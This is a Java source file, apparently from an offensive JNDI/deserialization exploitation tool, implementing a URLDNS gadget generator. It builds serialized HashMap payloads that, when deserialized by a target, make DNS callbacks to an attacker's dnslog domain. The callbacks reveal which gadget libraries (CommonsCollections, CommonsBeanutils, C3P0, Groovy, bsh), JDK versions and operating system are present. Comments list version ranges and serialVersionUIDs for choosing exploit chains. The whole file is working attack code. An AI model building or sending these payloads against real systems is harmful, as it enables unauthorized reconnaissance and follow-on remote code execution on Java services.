package com.nu1r.jndi.gadgets;

import com.nu1r.jndi.gadgets.utils.Reflections;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.InetAddress;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.util.HashMap;
import java.util.LinkedList;
import java.util.List;

import static com.nu1r.jndi.gadgets.utils.Utils.makeClass;

public class URLDNS {
    public static String[] defaultClass = new String[]{
            "CommonsCollections13567", "CommonsCollections24", "CommonsBeanutils2", "C3P0", "AspectJWeaver", "bsh",
            "Groovy", "Becl", "Jdk7u21", "JRE8u20", "winlinux"};

    public static List<Object> list = new LinkedList();

    public Object getObject(final String command) throws Exception {

        int sep = command.lastIndexOf(':');
        if (sep < 0) {
            throw new IllegalArgumentException("Command format is: <type>:<dnslog_url>");
        }

        String type = command.substring(0, sep);
        String url  = command.substring(sep + 1);

        switch (type) {
            // common 时会测试不常被黑名单禁用的类
            case "common":
                setList("CommonsBeanutils2", url);
                setList("C3P0", url);
                setList("AspectJWeaver", url);
                setList("bsh", url);
                setList("winlinux", url);
                break;

            // all 会测试全部类
            case "all":
                setList("all", url);
                break;

            // 默认指定类
            default:
                setList(type, url);
        }

        return list;
    }

    public static HashMap getURLDNSGadget(String urls, String clazzName) throws Exception {
        HashMap<Object, Object> hashMap = new HashMap<Object, Object>();
        URL   url = new URL("http://" + urls);
        Field f   = Class.forName("java.net.URL").getDeclaredField("hashCode");
        f.setAccessible(true);
        f.set(url, Integer.valueOf(0));
        Class<?> clazz = null;
        try {
            clazz = makeClass(clazzName);
        } catch (Exception e) {
            clazz = Class.forName(clazzName);
        }
        hashMap.put(url, clazz);
        f.set(url, Integer.valueOf(-1));
        return hashMap;
    }

    public static void setList(String clazzName, String dnsLog) throws Exception {


        switch (clazzName) {
            case "CommonsCollections13567":
                //CommonsCollections1/3/5/6/7链,需要<=3.2.1版本
                HashMap cc31or321 = getURLDNSGadget("cc31or321." + dnsLog, "org.apache.commons.collections.functors.ChainedTransformer");
                HashMap cc322 = getURLDNSGadget("cc322." + dnsLog, "org.apache.commons.collections.ExtendedProperties$1");
                list.add(cc31or321);
                list.add(cc322);
                break;
            case "CommonsCollections24":
                //CommonsCollections2/4链,需要4-4.0版本
                HashMap cc40 = getURLDNSGadget("cc40." + dnsLog, "org.apache.commons.collections4.functors.ChainedTransformer");
                HashMap cc41 = getURLDNSGadget("cc41." + dnsLog, "org.apache.commons.collections4.FluentIterable");
                list.add(cc40);
                list.add(cc41);
                break;
            case "CommonsBeanutils2":
                //CommonsBeanutils2链,serialVersionUID不同,1.7x-1.8x为-3490850999041592962,1.9x为-2044202215314119608
                HashMap cb17 = getURLDNSGadget("cb17." + dnsLog, "org.apache.commons.beanutils.MappedPropertyDescriptor$1");
                HashMap cb18x = getURLDNSGadget("cb18x." + dnsLog, "org.apache.commons.beanutils.DynaBeanMapDecorator$MapEntry");
                HashMap cb19x = getURLDNSGadget("cb19x." + dnsLog, "org.apache.commons.beanutils.BeanIntrospectionData");
                list.add(cb17);
                list.add(cb18x);
                list.add(cb19x);
                break;
            case "C3P0":
                //c3p0，serialVersionUID不同,0.9.2pre2-0.9.5pre8为7387108436934414104,0.9.5pre9-0.9.5.5为7387108436934414104
                HashMap c3p092x = getURLDNSGadget("c3p092x." + dnsLog, "com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase");
                HashMap c3p095x = getURLDNSGadget("c3p095x." + dnsLog, "com.mchange.v2.c3p0.test.AlwaysFailDataSource");
                list.add(c3p092x);
                list.add(c3p095x);
                break;
            case "AspectJWeaver":
                //AspectJWeaver,需要cc31
                HashMap ajw = getURLDNSGadget("ajw." + dnsLog, "org.aspectj.weaver.tools.cache.SimpleCache");
                list.add(ajw);
                break;
            case "bsh":
                //bsh,serialVersionUID不同,2.0b4为4949939576606791809,2.0b5为4041428789013517368,2.0.b6无法反序列化
                HashMap bsh20b4 = getURLDNSGadget("bsh20b4." + dnsLog, "bsh.CollectionManager$1");
                HashMap bsh20b5 = getURLDNSGadget("bsh20b5." + dnsLog, "bsh.engine.BshScriptEngine");
                HashMap bsh20b6 = getURLDNSGadget("bsh20b6." + dnsLog, "bsh.collection.CollectionIterator$1");
                list.add(bsh20b4);
                list.add(bsh20b5);
                list.add(bsh20b6);
                break;
            case "Groovy":
                //Groovy,1.7.0-2.4.3,serialVersionUID不同,2.4.x为-8137949907733646644,2.3.x为1228988487386910280
                HashMap groovy1702311 = getURLDNSGadget("groovy1702311." + dnsLog, "org.codehaus.groovy.reflection.ClassInfo$ClassInfoSet");
                HashMap groovy24x = getURLDNSGadget("groovy24x." + dnsLog, "groovy.lang.Tuple2");
                HashMap groovy244 = getURLDNSGadget("groovy244." + dnsLog, "org.codehaus.groovy.runtime.dgm$1170");
                list.add(groovy1702311);
                list.add(groovy24x);
                list.add(groovy244);
                break;
            case "Becl":
                //Becl,JDK<8u251
                HashMap becl = getURLDNSGadget("becl." + dnsLog, "com.sun.org.apache.bcel.internal.util.ClassLoader");
                list.add(becl);
                break;
            case "Jdk7u21":
                //JDK<=7u21
                HashMap Jdk7u21 = getURLDNSGadget("Jdk7u21." + dnsLog, "com.sun.corba.se.impl.orbutil.ORBClassLoader");
                list.add(Jdk7u21);
                break;
            case "JRE8u20":
                //7u25<=JDK<=8u20,虽然叫JRE8u20其实JDK8u20也可以,这个检测不完美,8u25版本以及JDK<=7u21会误报,可综合Jdk7u21来看
                HashMap JRE8u20 = getURLDNSGadget("JRE8u20." + dnsLog, "javax.swing.plaf.metal.MetalFileChooserUI$DirectoryComboBoxModel$1");
                list.add(JRE8u20);
                break;
            case "winlinux":
                //windows/linux版本判断
                HashMap linux = getURLDNSGadget("linux." + dnsLog, "sun.awt.X11.AwtGraphicsConfigData");
                HashMap windows = getURLDNSGadget("windows." + dnsLog, "sun.awt.windows.WButtonPeer");
                list.add(linux);
                list.add(windows);
                break;
            case "all":
                for (int i = 0; i < defaultClass.length; i++) {
                    setList(defaultClass[i], dnsLog);
                }
                break;
            default:
                HashMap hm = getURLDNSGadget(clazzName.replace(".", "_").replace("$", "_") + "." + dnsLog, clazzName);
                list.add(hm);
                break;
        }
    }
}
